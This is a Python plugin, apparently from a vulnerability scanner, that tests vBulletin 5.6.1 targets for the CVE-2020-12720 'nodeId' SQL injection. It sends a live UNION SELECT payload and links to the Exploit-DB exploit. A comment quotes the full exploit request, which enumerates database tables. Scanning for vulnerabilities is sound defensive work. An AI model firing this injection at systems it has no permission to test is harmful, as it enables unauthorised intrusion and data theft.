import cores


def run(req, target, info_cb, found_cb, not_found_cb):
    # https://www.exploit-db.com/exploits/48472
    # https://github.com/rekter0/exploits/blob/master/CVE-2020-12720/exploit.py
    # r = s.post(
    #     url+'/ajax/api/content_infraction/getIndexableContent',
    #     verify=False,headers={'X-Requested-With': 'XMLHttpRequest'},
    #     data={'nodeId[nodeid]':
    #               '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1 from'
    #               ' information_schema.columns WHERE column_name=\'phrasegroup_cppermission\';-- -'})
    name = "vBulletin 5.6.1 - CVE-2020-12720: 'nodeId' SQL Injection"
    uri = f"{target}ajax/api/content_infraction/getIndexableContent"
    check_hash = cores.gen_hash()
    payload = {
        "nodeId[nodeid]": f"1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,\"{check_hash}\",8,7,6,"
                          "5,4,3,2,1;-- "
    }
    is_vulnerable = False

    info_cb(f"Checking {name}")

    req.headers.update({'X-Requested-With': 'XMLHttpRequest'})
    r = req.post(uri, data=payload)

    if r.status_code == 200 and check_hash in str(r.content):
        import os
        exploit = "/usr/share/exploitdb/exploits/php/webapps/48472.py"
        if not os.path.exists(exploit) or not os.path.isfile(exploit):
            exploit = "https://www.exploit-db.com/exploits/48472"
        found_cb(name, exploit)
        is_vulnerable = True

    if not is_vulnerable:
        not_found_cb(name)
